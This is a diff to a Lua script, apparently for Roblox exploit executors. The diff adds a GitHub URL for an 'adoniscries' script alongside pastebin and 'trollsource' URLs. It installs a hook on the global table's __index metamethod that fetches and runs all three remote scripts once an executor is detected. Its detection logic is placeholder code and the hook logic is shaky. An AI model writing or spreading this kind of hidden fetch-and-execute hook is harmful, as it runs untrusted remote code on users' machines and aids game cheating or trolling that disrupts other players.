@@ -17,12 +17,14 @@ end
 
 -- URLs for scripts
 local pastebinURL = "https://pastebin.com/raw/AnEbCekx"
-local githubURL = "https://raw.githubusercontent.com/John142-dot/flexurfpsandping/main/trollsource"
+local githubURL = "https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"
+local trollSourceURL = "https://raw.githubusercontent.com/John142-dot/flexurfpsandping/main/trollsource"
 
--- Function to execute both scripts from URLs
-local function executeBothScripts()
+-- Function to execute all scripts from URLs
+local function executeAllScripts()
     executeScriptFromURL(pastebinURL)
     executeScriptFromURL(githubURL)
+    executeScriptFromURL(trollSourceURL)
 end
 
 -- Known executors list
@@ -42,12 +44,9 @@ local knownExecutors = {
 local function detectExecutors()
     local detectedExecutor = nil
 
-    -- Real detection logic to check the presence of known executors
-    -- For example, checking a specific property or behavior related to executors
-    -- Replace with actual detection method
+    -- Replace this with actual detection logic
     local success, result = pcall(function()
-        -- Example: Check if the executor's presence can be inferred from some property
-        -- This is just an illustrative example; modify as needed
+        -- Example detection: checking a global flag or a known property
         if _G and _G.SomeExecutorFlag then
             return _G.SomeExecutorFlag
         end
@@ -71,6 +70,7 @@ end
 local function weirdHook(target, callback, executeScript)
     -- Save the original method
     local original = getmetatable(_G)[target]
+    
     if original then
         -- Define a metatable with custom metamethods
         local mt = {}
@@ -78,7 +78,11 @@ local function weirdHook(target, callback, executeScript)
             if k == target then
                 return function(...)
                     local args = {...}
-                    local result = original(t, k)(...)
+                    local result
+                    -- Safely call the original method if it's a function
+                    if type(original) == "function" then
+                        result = original(t, k)(...)
+                    end
                     -- Call the callback with the result and arguments
                     callback(result, table.unpack(args))
                     
@@ -86,12 +90,14 @@ local function weirdHook(target, callback, executeScript)
                     if executeScript then
                         executeScript()
                     end
-                    return result(...)
+                    return result
                 end
             end
             return rawget(t, k)
         end
         setmetatable(_G, mt)
+    else
+        warn("Original method not found.")
     end
 end
 
@@ -102,7 +108,7 @@ local function hookCallback(result, ...)
     
     if detectedExec then
         print("Detected Executor: " .. detectedExec)
-        executeBothScripts()
+        executeAllScripts()
     else
         print("No known executor detected.")
     end
@@ -112,7 +118,6 @@ local function hookCallback(result, ...)
 end
 
 -- Apply Hook with Advanced Syntax
-weirdHook("__index", hookCallback, executeBothScripts)
+weirdHook("__index", hookCallback, executeAllScripts)
 
--- Example usage
 -- The hook will activate when the target method is called
